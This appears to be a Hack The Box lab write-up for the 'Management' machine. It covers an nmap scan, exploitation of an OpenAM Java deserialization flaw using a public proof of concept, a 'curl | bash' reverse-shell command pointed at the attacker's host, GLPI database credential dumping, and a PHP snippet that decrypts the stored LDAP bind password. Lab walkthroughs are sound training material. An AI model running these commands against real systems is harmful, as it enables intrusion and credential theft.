# Management-HTB

Initial nmap report:
````
└─$ cat nmap_report.txt              
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-14 10:05 -0300
Nmap scan report for 10.129.2.187
Host is up (0.34s latency).

PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.19 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
80/tcp    open  http     nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to https://10.129.2.187/
|_http-server-header: nginx/1.24.0 (Ubuntu)
443/tcp   open  ssl/http nginx 1.24.0 (Ubuntu)
| ssl-cert: Subject: commonName=management.htb/organizationName=Management Managed Services Ltd
| Subject Alternative Name: DNS:management.htb, DNS:*.management.htb
| Not valid before: 2026-06-02T01:21:44
|_Not valid after:  2126-05-09T01:21:44
| tls-alpn: 
|   http/1.1
|   http/1.0
|_  http/0.9
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_ssl-date: TLS randomness does not represent time
|_http-title: Did not follow redirect to https://management.htb/
1689/tcp  open  java-rmi Java RMI
| rmi-dumpregistry: 
|   org.opends.server.protocols.jmx.client-unknown
|     javax.management.remote.rmi.RMIServerImpl_Stub
|     @127.0.1.1:37339
|     extends
|       java.rmi.server.RemoteStub
|       extends
|_        java.rmi.server.RemoteObject
4444/tcp  open  ssl/ldap
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=sso.management.htb/organizationName=Administration Connector RSA Self-Signed Certificate
| Not valid before: 2026-06-02T01:23:59
|_Not valid after:  2046-05-28T01:23:59
| fingerprint-strings: 
|   LDAPSearchReq: 
|     0<0:
|     objectClass1+
|     ds-root-dse
|_    ds-cfg-root-dse-backend0
37339/tcp open  java-rmi Java RMI
50389/tcp open  ldap     (Anonymous bind OK)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port4444-TCP:V=7.99%T=SSL%I=7%D=9/14%Time=6AA7F17D%P=x86_64-pc-linux-gn
SF:u%r(LDAPSearchReq,55,"0E\x02\x01\x07d@\x04\x000<0:\x04\x0bobjectClass1\
SF:+\x04\x03top\x04\x0bds-root-dse\x04\x17ds-cfg-root-dse-backend0\x0c\x02
SF:\x01\x07e\x07\n\x01\0\x04\0\x04\0");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   315.87 ms 10.10.16.1
2   158.48 ms 10.129.2.187

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 104.00 seconds
````

We can check port 80, but there'll be nothing there:
<img width="1310" height="706" alt="image" src="https://github.com/user-attachments/assets/97b7d18c-30a2-4e78-9ba2-bb304a18aaae" />

Click on client login, and be redirected to a subdoamin called "sso.management.htb" append this indo /etc/hosts so you can access it:

<img width="763" height="652" alt="image" src="https://github.com/user-attachments/assets/a02d2486-adb2-40f6-93e1-10f40f38f965" />

Common logins don't work here, but we cheack the requests with BurpSuite:

<img width="1253" height="777" alt="image" src="https://github.com/user-attachments/assets/dc818ff2-50da-482e-b298-fc2a3ee0a47f" />

Here we found a very version number for opennam 16.0.5. If we search a CVE PoC for it in google, can come across this PoC written in Python https://github.com/infernosalex/CVE-2026-33439-Python-PoC. This vulnerability works by sending a seralized java objct as GET/POST parameter towards any JATO ViewBean endpoint whose JSP contains <jato:form> tags (e.g., the Password Reset pages). The Java object must be serialized with an exact version, the same used by the server, but the python PoC I found already comes with a valid object.

Git Clone the repository, create a simple bash revshell and serve it via a python server. After that start a simple netcat listener at you desired port, same one at the revshell. Execute the following command:
````
python3 exploit.py  --url https://sso.management.htb/openam/ui/PWResetUserValidation 'curl -s http://10.10.16.45:8000/shell.sh | bash'
````
A few seconds later, we should have a revshell:

<img width="1915" height="595" alt="image" src="https://github.com/user-attachments/assets/42fb2a31-0031-43a7-8c24-4cebd74390aa" />

So, we successfully logged in as Openam and we want to get to Owen, but we have no permissions.
While annumerating i found the following: a port used for sql at 3306 listening and glpi installed.
The port:

<img width="1915" height="337" alt="image" src="https://github.com/user-attachments/assets/c202edac-80e7-44fb-8138-20697c732c17" />

glpi:

<img width="1906" height="517" alt="image" src="https://github.com/user-attachments/assets/e7767557-768d-47ce-b690-5010dc5122a9" />

Inside the config directory we can find the following info:

<img width="1910" height="272" alt="image" src="https://github.com/user-attachments/assets/a986454d-2b8e-4673-90da-7fbcd70a0b9a" />

This tells uns that we have the creds for the database at 3306. We could dump the whole database, but it's huge:
````
mysqldump -h 127.0.0.1 -u glpi -p'8rhu0L6Pw4Y7' glpidb > glpidb.sql
````
Instead let's query it:
````
mysql -h 127.0.0.1 -u glpi -p'8rhu0L6Pw4Y7' glpidb -e "SHOW TABLES;"
````

Here the table that interests us is the following:

<img width="1391" height="405" alt="image" src="https://github.com/user-attachments/assets/c7b0300e-e6c8-4416-b6e5-d7303f2d6971" />

Check "glpi_authldaps";
````
$ mysql -h 127.0.0.1 -u glpi -p'8rhu0L6Pw4Y7' glpidb -e "SELECT * FROM glpi_authldaps;" -t
+----+----------------------+--------------------+----------------------+----------------------------------------------+------+-----------+-------------+------------+---------+-------------+-----------------+-------------------+--------------------+--------------+----------------+-----------------+-------------+--------------+--------------+---------------+--------+-------------+--------------+-------------+----------------+----------------+---------------------+---------------------------------------------------------------------+------------+-----------+--------------------------------------------------------------------------+---------------------------+--------------+--------------+--------------+----------------+-------------------+----------+---------------+----------------------+---------------+------------------+----------------+---------------------+------------------+--------------+-------------+----------+---------+-------------+
| id | name                 | host               | basedn               | rootdn                                       | port | condition | login_field | sync_field | use_tls | group_field | group_condition | group_search_type | group_member_field | email1_field | realname_field | firstname_field | phone_field | phone2_field | mobile_field | comment_field | use_dn | time_offset | deref_option | title_field | category_field | language_field | date_mod            | comment                                                             | is_default | is_active | rootdn_passwd                                                            | registration_number_field | email2_field | email3_field | email4_field | location_field | responsible_field | pagesize | ldap_maxlimit | can_support_pagesize | picture_field | begin_date_field | end_date_field | date_creation       | inventory_domain | tls_certfile | tls_keyfile | use_bind | timeout | tls_version |
+----+----------------------+--------------------+----------------------+----------------------------------------------+------+-----------+-------------+------------+---------+-------------+-----------------+-------------------+--------------------+--------------+----------------+-----------------+-------------+--------------+--------------+---------------+--------+-------------+--------------+-------------+----------------+----------------+---------------------+---------------------------------------------------------------------+------------+-----------+--------------------------------------------------------------------------+---------------------------+--------------+--------------+--------------+----------------+-------------------+----------+---------------+----------------------+---------------+------------------+----------------+---------------------+------------------+--------------+-------------+----------+---------+-------------+
|  1 | Management Directory | sso.management.htb | dc=management,dc=htb | cn=svc-glpi,ou=services,dc=management,dc=htb |  389 | NULL      | uid         | uid        |       0 | NULL        | NULL            |                 0 | NULL               | NULL         | NULL           | NULL            | NULL        | NULL         | NULL         | NULL          |      1 |           0 |            0 | NULL        | NULL           | NULL           | 2026-06-02 01:25:41 | Primary directory bind used to synchronise managed client accounts. |          0 |         1 | avrqW65aZWKzLAKWhPxZGn1eLj3yYAnwUp08mEazsJUWfI5cqbaP6vM12w0p/ykpmyO3Pw== | NULL                      | NULL         | NULL         | NULL         | NULL           | NULL              |        0 |             0 |                    0 | NULL          | NULL             | NULL           | 2026-06-02 01:25:41 | NULL             | NULL         | NULL        |        1 |      10 | NULL        |
+----+----------------------+--------------------+----------------------+----------------------------------------------+------+-----------+-------------+------------+---------+-------------+-----------------+-------------------+--------------------+--------------+----------------+-----------------+-------------+--------------+--------------+---------------+--------+-------------+--------------+-------------+----------------+----------------+---------------------+---------------------------------------------------------------------+------------+-----------+--------------------------------------------------------------------------+---------------------------+--------------+--------------+--------------+----------------+-------------------+----------+---------------+----------------------+---------------+------------------+----------------+---------------------+------------------+--------------+-------------+----------+---------+-------------+
$ 
````
rootdn_passwd is avrqW65aZWKzLAKWhPxZGn1eLj3yYAnwUp08mEazsJUWfI5cqbaP6vM12w0p/ykpmyO3Pw==

Hashid does not know what this is but, it seems like base 64. Do keep hold of it:
<img width="902" height="60" alt="image" src="https://github.com/user-attachments/assets/0ccbb128-277f-4578-b3b4-1e61a13089c1" />

This is a binary key for cryptography
<img width="423" height="40" alt="image" src="https://github.com/user-attachments/assets/b2c56503-d850-4208-bd5c-dd591e85cb93" />


We would do good looking at the source code for glpi. Doing that we found /opt/glpi/src/GLPIKey.php, that tells us that the encryption type used for this password is sodium_crypto_aead_chacha20poly1305_ietf and also how to decrypt the data we found as rootdn_passwd, including nonce size, key format.

For example, this tells us exactly how the excryption process works:
````
    try {
            $plaintext = sodium_crypto_aead_xchacha20poly1305_ietf_decrypt(
                $ciphertext,
                $nonce,
                $nonce,
                $key
            );
            return $plaintext;

````
To decrypt the hash just cp this into your terminal:
````
php -r '
$k=file_get_contents("/opt/glpi/config/glpicrypt.key");
$v=base64_decode("avrqW65aZWKzLAKWhPxZGn1eLj3yYAnwUp08mEazsJUWfI5cqbaP6vM12w0p/ykpmyO3Pw==");
$nonce=substr($v,0,24);
$ct=substr($v,24);
$pt=sodium_crypto_aead_xchacha20poly1305_ietf_decrypt($ct,$nonce,$nonce,$k);
echo $pt, PHP_EOL;
'
````

<img width="972" height="131" alt="image" src="https://github.com/user-attachments/assets/13561940-7d45-436a-9221-e97361fb8a59" />

<img width="1901" height="307" alt="image" src="https://github.com/user-attachments/assets/2a6fd2fe-16d3-4667-ac3b-5c8aa7393350" />



